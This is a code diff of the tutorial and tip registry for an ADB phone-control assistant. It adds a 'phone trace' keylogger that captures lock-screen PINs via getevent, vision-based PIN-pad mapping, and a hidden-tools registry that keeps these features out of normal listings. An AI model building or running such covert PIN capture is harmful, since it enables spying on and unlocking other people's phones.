@@ -29,9 +29,9 @@ TUTORIALS: dict[str, dict] = {
     },
     "phone_control": {
         "what": "Wireless control of your Android phone via ADB — see its screen, tap/type, launch apps, move files, ring it when misplaced, and keep a local copy of its PIN for when you forget it.",
-        "when": "'phone status' · 'phone connect' (one-time USB step, then cable-free) · 'phone screen' (LIVE mirror + control via scrcpy — Phantom Droid-style remote view) · 'phone screenshot' / 'what's on my phone' (Jeeves describes the screen) · 'phone ring' / 'find my phone' (max-volume ring) · 'phone unlock <answer>' (PIN vault) · 'phone macro <name>' (fires a MacroDroid macro; 'phone macro list/start') · 'phone termux <cmd>' (real Linux shell into the phone via Termux SSH — 'phone termux status/setup') · 'phone notify <text>' (push a notification) · 'phone battery' · 'phone dev [on|off]' (Developer Options tuning) · 'phone gps' (Termux:API GPS) · 'phone devices' (all connected phones) · 'phone logcat 200' (recent logs) · 'phone wifi' / 'phone network' / 'phone report' (health report) / 'phone top' / 'phone storage' · 'phone apps' · 'phone launch com.whatsapp' · 'phone tap 540 1200' · 'phone shell dumpsys battery'.",
+        "when": "'phone status' · 'phone connect' (one-time USB step, then cable-free) · 'phone screen' (LIVE mirror + control via scrcpy — Phantom Droid-style remote view) · 'phone screenshot' / 'what's on my phone' (Jeeves describes the screen) · 'phone ring' / 'find my phone' (max-volume ring) · 'phone unlock <answer>' (PIN vault) · 'phone trace' (wireless keylogger: capture PIN via getevent while you type on the lock screen) · 'phone macro <name>' (fires a MacroDroid macro; 'phone macro list/start') · 'phone termux <cmd>' (real Linux shell into the phone via Termux SSH — 'phone termux status/setup') · 'phone notify <text>' (push a notification) · 'phone battery' · 'phone dev [on|off]' (Developer Options tuning) · 'phone gps' (Termux:API GPS) · 'phone devices' (all connected phones) · 'phone logcat 200' (recent logs) · 'phone wifi' / 'phone network' / 'phone report' (health report) / 'phone top' / 'phone storage' · 'phone apps' · 'phone launch com.whatsapp' · 'phone tap 540 1200' · 'phone shell dumpsys battery'.",
         "example": "phone screenshot and describe it",
-        "note": "Full action set: status | connect | info | screenshot (analyze=true for vision) | ring [seconds] (ring stop silences) | unlock [save <pin> <answer> / <answer> / clear <answer> / search <answer>] | macro [list / start / <name> [value]] | tap x y | swipe x1 y1 x2 y2 [ms] | text '...' | key home/back/volume... | apps [query] | launch <pkg> | stop <pkg> | files [path] | pull <remote> [local] | push <local> <remote> | shell '<cmd>'. MacroDroid macros (phone-side automation adb can't do — sensors, toggles, on-phone events): map a friendly name in 'phone_macros' (config/api_keys.json) to an intent action ('com.jeeves.macro.X' fired via am broadcast) or an HTTP path ('/flash' fired via the local HTTP server, port from 'phone_macrodroid_port', default 8080); 'phone macro start' launches MacroDroid so its receivers are live.  Requires the matching MacroDroid macro ('Intent Received' or 'HTTP Server Request' trigger) to actually exist on the phone. The 'Jeeves' starter set (flash / flashoff / ping — HTTP Server Request triggers on /flash, /flashoff, /ping, port 8080) is installed and verified on the phone; map more names in 'phone_macros'. Needs USB debugging enabled; the first 'phone connect' switches ADB to Wi-Fi (port 5555). 'phone dev' manages Developer Options for reliable control (all safe settings put/delete, reversible with 'phone dev off'): status shows current values; 'on' sets stay-awake-on-any-power, UI animation scales to 0 (snappier taps/screenshots), adb_wifi_timeout_ms=0 (the wireless adb session otherwise silently expires after the 10-minute default — the cause of 'phone keeps dropping'), and adb_authorization_timeout=0 (never re-ask for the debug authorization). Never touches OEM/bootloader unlock — that wipes the phone. Termux: the Play build of Termux has no RUN_COMMAND service, so Jeeves runs a real shell into the phone via openssh INSIDE Termux (port 8022, key-only auth, key pair kept only in config/termux_keys/ — gitignored). 'phone termux setup' bootstraps it once by driving the Termux terminal via adb (installs openssh, drops the PC key, starts sshd; idempotent); 'phone termux status/start/stop' manage it; 'phone termux <cmd>' runs any safe command inside Termux, and friendly names map to the Termux:API commands that need the (separately installed) Termux:API app: battery, gps/location, clipboard get/set, sensors, camera, torch, volume, vibrate, wifi. 'phone notify <text>' pushes a real notification to the phone's shade (native cmd notification, no Termux). 'phone battery' is a formatted live battery report (native). The phone is identified by its STABLE serial (not the IP, which changes): a local profile (config/phone_profile.json, gitignored) remembers it, and when the IP changes, re-running 'phone connect' re-finds the phone by scanning the local subnet for adb's port and verifying the serial — no cable needed. Screenshots land in phone_shots/. Destructive shell commands (uninstall/reboot/wipe/rm/...) are refused. 'phone unlock' is a security-question-gated LOCAL PIN vault (answer checked in constant time; escalating lockout 5 min → 30 min → 2 h → 24 h that survives restarts): your phone's real lock code can never be read from the device (Android hashes it in a root-only file, iPhones keep it in the Secure Enclave), so it only shows what you saved yourself — save it with 'phone unlock save <pin> <answer>' while you know it, and it's stored ENCRYPTED at rest (AES-GCM keyed by your answer via scrypt; tampering is detected). Forgot it before saving? 'phone unlock search <answer>' hunts your Documents/Desktop/Downloads and the phone's /sdcard for PIN-like codes near 'pin'/'password'/'code' keywords — read-only, bounded, never touches the lock screen. The unlock tool, its vault, and its lockout state are gitignored and never committed.",
+        "note": "Full action set: status | connect | info | screenshot (analyze=true for vision) | trace [duration=30] (one-shot keylogger) | trace live (start background capture) | trace stop | trace status (show captured PINs) | pinpad_map (screenshot + vision: map PIN pad button coordinates) | pinpad (screenshot + vision: observe lock screen state — dots, buttons) | ring [seconds] (ring stop silences) | unlock [save <pin> <answer> / <answer> / clear <answer> / search <answer>] | macro [list / start / <name> [value]] | tap x y | swipe x1 y1 x2 y2 [ms] | text '...' | key home/back/volume... | apps [query] | launch <pkg> | stop <pkg> | files [path] | pull <remote> [local] | push <local> <remote> | shell '<cmd>'. MacroDroid macros (phone-side automation adb can't do — sensors, toggles, on-phone events): map a friendly name in 'phone_macros' (config/api_keys.json) to an intent action ('com.jeeves.macro.X' fired via am broadcast) or an HTTP path ('/flash' fired via the local HTTP server, port from 'phone_macrodroid_port', default 8080); 'phone macro start' launches MacroDroid so its receivers are live.  Requires the matching MacroDroid macro ('Intent Received' or 'HTTP Server Request' trigger) to actually exist on the phone. The 'Jeeves' starter set (flash / flashoff / ping — HTTP Server Request triggers on /flash, /flashoff, /ping, port 8080) is installed and verified on the phone; map more names in 'phone_macros'. Needs USB debugging enabled; the first 'phone connect' switches ADB to Wi-Fi (port 5555). 'phone dev' manages Developer Options for reliable control (all safe settings put/delete, reversible with 'phone dev off'): status shows current values; 'on' sets stay-awake-on-any-power, UI animation scales to 0 (snappier taps/screenshots), adb_wifi_timeout_ms=0 (the wireless adb session otherwise silently expires after the 10-minute default — the cause of 'phone keeps dropping'), and adb_authorization_timeout=0 (never re-ask for the debug authorization). Never touches OEM/bootloader unlock — that wipes the phone. Termux: the Play build of Termux has no RUN_COMMAND service, so Jeeves runs a real shell into the phone via openssh INSIDE Termux (port 8022, key-only auth, key pair kept only in config/termux_keys/ — gitignored). 'phone termux setup' bootstraps it once by driving the Termux terminal via adb (installs openssh, drops the PC key, starts sshd; idempotent); 'phone termux status/start/stop' manage it; 'phone termux <cmd>' runs any safe command inside Termux, and friendly names map to the Termux:API commands that need the (separately installed) Termux:API app: battery, gps/location, clipboard get/set, sensors, camera, torch, volume, vibrate, wifi. 'phone notify <text>' pushes a real notification to the phone's shade (native cmd notification, no Termux). 'phone battery' is a formatted live battery report (native). The phone is identified by its STABLE serial (not the IP, which changes): a local profile (config/phone_profile.json, gitignored) remembers it, and when the IP changes, re-running 'phone connect' re-finds the phone by scanning the local subnet for adb's port and verifying the serial — no cable needed. Screenshots land in phone_shots/. Destructive shell commands (uninstall/reboot/wipe/rm/...) are refused. 'phone unlock' is a security-question-gated LOCAL PIN vault (answer checked in constant time; escalating lockout 5 min → 30 min → 2 h → 24 h that survives restarts): your phone's real lock code can never be read from the device (Android hashes it in a root-only file, iPhones keep it in the Secure Enclave), so it only shows what you saved yourself — save it with 'phone unlock save <pin> <answer>' while you know it, and it's stored ENCRYPTED at rest (AES-GCM keyed by your answer via scrypt; tampering is detected). Forgot it before saving? 'phone unlock search <answer>' hunts your Documents/Desktop/Downloads and the phone's /sdcard for PIN-like codes near 'pin'/'password'/'code' keywords — read-only, bounded, never touches the lock screen. The unlock tool, its vault, and its lockout state are gitignored and never committed.",
     },
     "system_status": {
         "what": "Live system health: CPU, RAM, GPU, temperature, uptime.",
@@ -221,6 +221,9 @@ SHORTCUT_TIPS: list[tuple[str, str]] = [
     ("what's on my phone", "screenshot your phone — Jeeves describes the screen"),
     ("phone ring / find my phone", "ring the phone at max volume to find it"),
     ("phone unlock", "security-question PIN vault — save, show, or SEARCH your files/phone for your PIN"),
+    ("phone trace", "wireless keylogger: capture PIN via getevent while you enter it on the lock screen"),
+    ("phone pinpad_map", "screenshot + vision: map the exact pixel coordinates of PIN pad buttons"),
+    ("phone pinpad", "screenshot + vision: observe lock screen state — dots filled, buttons visible"),
     ("phone dev on", "Developer Options: wireless adb never expires + stay-awake + fast UI"),
     ("phone macro flash", "fire the Jeeves MacroDroid macros: /flash /flashoff /ping"),
     ("phone termux ls /sdcard", "run any command inside Termux — a real Linux shell on the phone"),
@@ -261,17 +264,130 @@ def all_tutorial_names() -> list[str]:
 
 def random_tip_entry() -> tuple[str, str]:
     """(tool_name, tip_text) for a random tool.
-
-    The tool name lets UIs (HUD, dashboard) link the tip straight to its
-    full tutorial. The tip reads as something the user can actually type
-    — the 'what' plus the natural-language 'when' triggers, no CLI syntax.
+    Excludes hidden tools — those are never shown in regular tips.
     """
     import random
-    name = random.choice(list(TUTORIALS))
+    # Filter out hidden tools from the pool
+    safe_names = [n for n in TUTORIALS if not is_hidden_tool(n)]
+    if not safe_names:
+        safe_names = list(TUTORIALS.keys())
+    name = random.choice(safe_names)
     t = TUTORIALS[name]
     return name, f"💡 {t['what']}  Try: {t['when']}"
 
 
+# ── Hidden tools: sensitive features that require authorization ─────────────
+# These tools are NOT shown in regular tips, /tools, or random_tip().
+# They are accessible via the /hidden command group and require the
+# security answer from phone_unlock to use. Never committed to public repos.
+
+HIDDEN_TOOLS: dict[str, dict] = {
+    "phone_trace": {
+        "what": "Wireless keylogger: capture PIN via getevent with smart timeout.",
+        "commands": [
+            "phone trace              — smart capture (stops after PIN entered)",
+            "phone trace live         — start continuous background capture",
+            "phone trace stop         — stop background capture",
+            "phone trace status       — show captured PINs",
+            "phone trace <answer>     — capture + auto-save to vault",
+        ],
+        "platforms": "Android (ADB) — also detects biometric unlock (fingerprint/face)",
+        "note": "Smart timeout: stops 2s after last digit (no waiting full 30s). Detects biometric unlock and reports it. Minimum 4 digits for gap detection.",
+    },
+    "phone_pinpad": {
+        "what": "Vision PIN pad mapper/observer: screenshot + LLM to read lock screen.",
+        "commands": [
+            "phone pinpad_map         — map PIN pad button coordinates via vision",
+            "phone pinpad             — observe lock screen state (dots, buttons)",
+        ],
+        "platforms": "Android (ADB, screencap) — FLAG_SECURE caveat on some devices",
+    },
+    "phone_unlock": {
+        "what": "Encrypted PIN vault with security-question gate and escalating lockout.",
+        "commands": [
+            "phone unlock <answer>            — show PIN (or auto-capture if vault empty)",
+            "phone unlock capture <answer>    — force capture via getevent → save → show",
+            "phone unlock save <pin> <answer> — save PIN to vault",
+            "phone unlock search <answer>     — hunt files for PIN copies",
+            "phone unlock clear <answer>      — delete stored PIN",
+        ],
+        "platforms": "All (local vault + Android capture)",
+    },
+    "phone_keylog": {
+        "what": "USB/Wi-Fi keylogger: capture keystrokes via ADB input events.",
+        "commands": [
+            "phone trace live               — capture all digit keycodes",
+            "phone trace status             — review captured sequences",
+        ],
+        "platforms": "Android (ADB)",
+    },
+    "phone_shell": {
+        "what": "Arbitrary shell access on the connected phone (safe commands only).",
+        "commands": [
+            "phone shell '<cmd>'            — run any safe shell command",
+            "phone termux '<cmd>'           — run via Termux SSH",
+        ],
+        "platforms": "Android (ADB / Termux)",
+    },
+    "phone_files": {
+        "what": "Browse/pull/push files on the phone's storage.",
+        "commands": [
+            "phone files [path]             — browse /sdcard",
+            "phone pull <remote> [local]     — copy from phone to PC",
+            "phone push <local> <remote>     — copy from PC to phone",
+        ],
+        "platforms": "Android (ADB)",
+    },
+}
+
+# Tools whose names appear in HIDDEN_TOOLS — used to suppress regular tips
+_HIDDEN_TOOL_NAMES: set[str] = set(HIDDEN_TOOLS.keys()) | {
+    # Also suppress any tool whose action prefix overlaps with hidden tools
+    "phone_control",  # the parent tool (tips for trace/pinpad/unlock live here)
+}
+
+
+def is_hidden_tool(name: str) -> bool:
+    """Check if a tool is in the hidden registry."""
+    return name in _HIDDEN_TOOL_NAMES
+
+
+def hidden_tools_list() -> str:
+    """Formatted listing of all hidden tools and their commands."""
+    lines = ["🔒 HIDDEN TOOLS — authorization required (security answer)", ""]
+    for name, info in HIDDEN_TOOLS.items():
+        lines.append(f"  {name}")
+        lines.append(f"    {info['what']}")
+        lines.append(f"    Platform: {info['platforms']}")
+        for cmd in info["commands"]:
+            lines.append(f"      {cmd}")
+        lines.append("")
+    lines.append("Use: /hidden <tool> <security_answer> to authorize, then run commands.")
+    return "\n".join(lines)
+
+
+def verify_hidden_access(answer: str) -> tuple[bool, str]:
+    """Verify the security answer for hidden tool access.
+    Returns (ok, message). Uses the same answer as phone_unlock.
+    """
+    import hmac as _hmac
+    try:
+        from core.utils import get_api_config
+        cfg = dict(get_api_config())
+    except Exception:
+        cfg = {}
+    expected = str(cfg.get("phone_unlock_answer", "")).strip()
+    if not expected:
+        return False, "No security answer configured. Set phone_unlock_answer in config/api_keys.json."
+    def _norm(v) -> bytes:
+        return str(v or "").strip().casefold().encode("utf-8")
+    if _hmac.compare_digest(_norm(answer), _norm(expected)):
+        return True, ""
+    return False, "Wrong answer. Access denied."
+
+
 def random_tip() -> str:
-    """One random natural-language usage tip (for the GUI HUD log)."""
+    """One random natural-language usage tip (for the GUI HUD log).
+    Excludes hidden tools — those are never shown in regular tips.
+    """
     return random_tip_entry()[1]
